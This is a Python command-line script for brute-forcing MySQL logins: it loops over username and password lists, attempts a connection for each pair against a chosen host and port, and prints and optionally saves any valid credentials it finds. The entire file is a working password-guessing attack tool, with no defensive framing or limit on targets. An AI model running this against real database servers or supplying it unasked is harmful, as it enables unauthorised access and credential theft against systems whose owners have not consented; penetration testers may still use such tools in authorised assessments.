import sys
import argparse
import MySQLdb
from colorama import init, Fore
import socket

# Initialize colorama for colored output
init()
GREEN = Fore.GREEN
RED = Fore.RED
RESET = Fore.RESET

def connect(host, user, password, port, timeout):
    """Attempt to connect to the MySQL server with provided credentials."""
    try:
        MySQLdb.connect(host=host, port=port, user=user, password=password, connect_timeout=timeout)
        result = f"{GREEN}[+] Found valid credentials:\n\tHOSTNAME: {host}\n\tUSERNAME: {user}\n\tPASSWORD: {password}{RESET}"
        print(result)
        return result
    except MySQLdb.OperationalError as e:
        if e.args[0] == 2005:  # Error code for "Unknown server host"
            print(f"{RED}[!] Invalid hostname or IP address: {host}. Stopping the brute force process.{RESET}")
            return "invalid_host"
        else:
            print(f"{RED}[-] Invalid credentials or connection error: {str(e)}{RESET}")
    except socket.gaierror:
        print(f"{RED}[!] Invalid hostname or IP address: {host}. Stopping the brute force process.{RESET}")
        return "invalid_host"
    except Exception as e:
        print(f"{RED}[-] Unexpected error: {str(e)}{RESET}")
    return None

def brute_force_mysql(host, port, usernames, passwords, timeout, output_file):
    """Perform a brute force attack on the MySQL server."""
    try:
        for user in usernames:
            print(f"\n{GREEN}[!] Testing username: '{user}'{RESET}")
            found = False
            for password in passwords:
                print(f"[!] Trying password: '{password}' for username: '{user}'")
                result = connect(host, user, password, port, timeout)
                if result == "invalid_host":
                    print(f"{RED}[!] Stopping brute force due to invalid hostname or IP address.{RESET}")
                    sys.exit(1)  # Exit immediately
                elif result:  # Valid credentials found
                    found = True
                    if output_file:
                        with open(output_file, "a") as file:
                            file.write(f"HOSTNAME: {host}\tUSERNAME: {user}\tPASSWORD: {password}\n")
                    break
            if found:
                print(f"{GREEN}[+] Valid credentials found for username '{user}'{RESET}")
            else:
                print(f"{RED}[-] No valid credentials found for username '{user}'.{RESET}")
    except KeyboardInterrupt:
        print(f"\n{RED}[!] Process interrupted by user. Exiting...{RESET}")
        sys.exit(1)

def mysql_bruteforce_main(args=None):
    """Main function to parse arguments and initiate brute-forcing."""
    parser = argparse.ArgumentParser(description="MySQL brute-force script with dynamic options.")
    parser.add_argument("-host", "--host", required=True, help="Single domain or IP Address to brute-force.")
    parser.add_argument("-port", "--port", type=int, default=3306, help="MySQL port (default: 3306)")
    parser.add_argument("-U", "--usernames", help="File containing list of usernames for brute-force.")
    parser.add_argument("-P", "--passwords", help="File containing list of passwords.")
    parser.add_argument("-u", "--user", help="Single username for authentication.")
    parser.add_argument("-p", "--password", help="Single password for authentication.")
    parser.add_argument("-T", "--timeout", type=int, default=3, help="Connection timeout in seconds (default: 3)")
    parser.add_argument("-o", "--output", help="File to save found credentials.")

    args = parser.parse_args(args)
    host, port, timeout, output_file = args.host, args.port, args.timeout, args.output

    # Load usernames
    if args.usernames:
        usernames = list(read_file_in_chunks(args.usernames))
    elif args.user:
        usernames = [args.user]
    else:
        print(f"{RED}[!] No usernames provided. Use -U for a list or -u for a single username.{RESET}")
        sys.exit(1)

    # Load passwords
    if args.passwords:
        passwords = list(read_file_in_chunks(args.passwords))
    elif args.password:
        passwords = [args.password]
    else:
        print(f"{RED}[!] No passwords provided. Use -P for a list or -p for a single password.{RESET}")
        sys.exit(1)

    brute_force_mysql(host, port, usernames, passwords, timeout, output_file)

def read_file_in_chunks(file_path):
    """Read file line by line and strip whitespaces."""
    with open(file_path, "r") as file:
        for line in file:
            yield line.strip()

if __name__ == "__main__":
    mysql_bruteforce_main()
